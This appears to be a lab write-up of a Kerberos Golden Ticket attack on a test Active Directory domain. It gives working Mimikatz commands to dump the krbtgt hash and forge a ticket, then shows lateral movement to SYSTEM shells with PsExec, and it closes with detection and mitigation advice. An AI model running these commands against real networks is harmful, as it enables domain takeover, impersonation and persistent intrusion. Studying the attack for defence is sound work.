# Golden Ticket Attack (MITRE ATT&CK T1558.001)

## Overview

The **Golden Ticket** attack is a Kerberos persistence technique that allows an attacker to forge Ticket Granting Tickets (TGTs) using the compromised `krbtgt` account hash.

When we previously dumped credentials using Mimikatz, we extracted the NTLM hash of the `krbtgt` account — the account responsible for signing and generating Kerberos tickets in the domain.

If an attacker controls the `krbtgt` hash:

> They can generate valid Kerberos tickets for **any user**, with **any privilege level**, for **any system** in the domain.

This effectively grants complete control over the Active Directory environment.

---

## Why the `krbtgt` Account Is Critical

The `krbtgt` account is used by the **Key Distribution Center (KDC)** on the Domain Controller to:

* Issue Ticket Granting Tickets (TGTs)
* Sign and validate Kerberos tickets

If its NTLM hash is compromised, the attacker can:

* Forge authentication tickets
* Impersonate Domain Admins
* Access any domain-joined system
* Maintain long-term persistence

---

# Step 1 — Dump the `krbtgt` Hash

Using Mimikatz:

```bash
lsadump::lsa /inject /name:krbtgt
```

📸 Screenshot:

```
screenshots/01-krbtgt-credentials.png
```

From the output, we need:

* **Domain SID**
* **NTLM hash of the krbtgt account**

These two values are required to forge the Golden Ticket.

---

# Step 2 — Forge the Golden Ticket

We use the following command:

```bash
kerberos::golden /User:Administrator \
/domain:spectra.local \
/sid:S-1-5-21-793764166-1644529926-3022556114 \
/krbtgt:33a759a77e4cbd0d40528ab62c320bba \
/id:500 \
/ptt
```

### Parameter Breakdown

* `/User:Administrator` → User we want to impersonate
* `/domain:spectra.local` → Target domain
* `/sid:` → Domain SID
* `/krbtgt:` → NTLM hash of krbtgt account
* `/id:500` → RID for built-in Administrator
* `/ptt` → **Pass The Ticket** (inject directly into memory)

📸 Screenshot:

```
screenshots/02-golden-ticket-forged-submitted.png
```

At this point, a forged Kerberos TGT has been injected into memory.

---

# Step 3 — Spawn a New Shell with the Injected Ticket

We launch a new command shell from Mimikatz:

```bash
misc::cmd
```

This spawns a new shell that inherits the forged Kerberos ticket.

---

# Step 4 — Access Other Machines in the Domain

We can now access administrative shares across the network:

```bash
dir \\DR-ADAM\c$
```

📸 Screenshot:

```
screenshots/03-access-to-other-user.png
```

If successful, this confirms:

* The forged ticket is valid
* We have administrative access
* The target machine trusts the domain

---

## Important Requirement

To successfully access remote systems:

* The machine must be **domain joined**
* DNS must point to the Domain Controller
* A secure channel (trust relationship) must exist

Without proper domain configuration, Kerberos authentication will fail.

---

# Step 5 — Gain a Full Remote Shell with PsExec

To escalate further, we can use **PsExec** to obtain a proper remote shell.

PsExec is part of Sysinternals.

After downloading `PsExec.exe`, we execute:

```bash
PsExec.exe \\DR-ADAM cmd.exe
```

📸 Screenshot:

```
screenshots/04-psexec-gain-shell-via-golden-ticket.png
```

If successful:

* A remote SYSTEM-level shell is opened
* Full control of the target machine is achieved

📸 Additional shells:

```
screenshots/05-psexec-gain-another-shell-via-golden-ticket.png
screenshots/06-psexec-gain-others-shell-via-golden-ticket.png
```

This demonstrates lateral movement across multiple hosts using the forged Golden Ticket.

---

# Why This Is Persistence

The Golden Ticket attack provides:

* Long-term domain access
* The ability to re-authenticate at will
* Impersonation of any user
* Domain-wide administrative privileges

Even if:

* Passwords are changed
* Accounts are disabled

The attacker can continue generating valid Kerberos tickets until the `krbtgt` password is rotated (twice).

---

# Detection and Mitigation

## 1️⃣ Rotate the `krbtgt` Password (Twice)

* Must be reset **two times**
* Invalidates existing forged tickets
* Requires careful planning in production environments

---

## 2️⃣ Monitor for Abnormal TGT Lifetimes

Golden Tickets often:

* Have unusually long expiration times
* Show abnormal ticket characteristics

Monitor Kerberos logs on Domain Controllers.

---

## 3️⃣ Restrict Domain Admin Access

* Implement tiered administration
* Limit DC logons
* Prevent credential dumping

---

## 4️⃣ Monitor for Mimikatz Indicators

Look for:

* Suspicious LSASS access
* Unusual Kerberos ticket behavior
* Memory injection attempts

---

# Key Takeaway

If an attacker obtains the `krbtgt` NTLM hash:

> They effectively control the entire Active Directory domain.

The Golden Ticket attack is one of the most powerful Kerberos persistence techniques and represents total domain compromise.

---
